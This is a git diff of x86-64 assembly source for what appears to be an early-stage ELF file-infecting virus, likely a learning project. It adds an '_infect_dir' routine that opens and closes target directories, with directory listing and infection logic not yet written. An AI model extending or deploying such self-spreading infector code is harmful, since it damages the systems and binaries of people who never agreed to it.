@@ -22,7 +22,7 @@ _start:
 
 newline db `\n`, 0x0
 
-_ft_strlen:
+_ft_strlen:; (string rsi)
 	xor rax, rax; = 0
 	_count_char:
 		cmp byte [rsi + rax], 0
@@ -32,7 +32,7 @@ _ft_strlen:
 	_end_count_char:
 ret
 
-_print:
+_print:; (string rsi)
 	call _ft_strlen
 	push rax; mov rdx, rax
 	pop rdx
@@ -69,13 +69,8 @@ _inject:
 	xor rcx, rcx; = 0
 	_loop_dir:
 		add rsi, rcx
+		call _infect_dir
 		xor rcx, rcx; = 0
-%ifdef DEBUG
-		push rcx
-		call _print
-		pop rcx
-%endif
-		; TODO: go through dir and do things
 		_seek_next_string:; seek next dir
 			inc rcx
 			cmp byte[rsi + rcx], 0x0
@@ -87,6 +82,46 @@ _inject:
 	xor rax, rax; = 0
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jnz _infected
+	jmp _host
+
+_infect_dir:; (string rsi)
+%ifdef DEBUG
+	call _print
+%endif
+	push rsi
+	pop rdi
+;	sub rsp, 1024; buffer of 1024 on stack
+	push 2
+	pop rax; open
+	push 0o0200000; O_RDONLY | O_DIRECTORY
+	pop rsi
+	syscall
+	cmp rax, 0x0
+	jl _end_infect_dir; jump lower
+
+	push rdi
+	pop r10
+	push rax
+	pop rdi
+;	push 78
+;	pop rax; getdents
+;	push 1024
+;	pop rdx
+;	mov rsi, rsp
+;	syscall
+	
+	push 3
+	pop rax; close
+	syscall
+
+	push r10
+	pop rdi
+
+	_end_infect_dir:
+;	add rsp, 1024
+	push rdi
+	pop rsi
+ret
 
 _host:
 	jmp _check_end
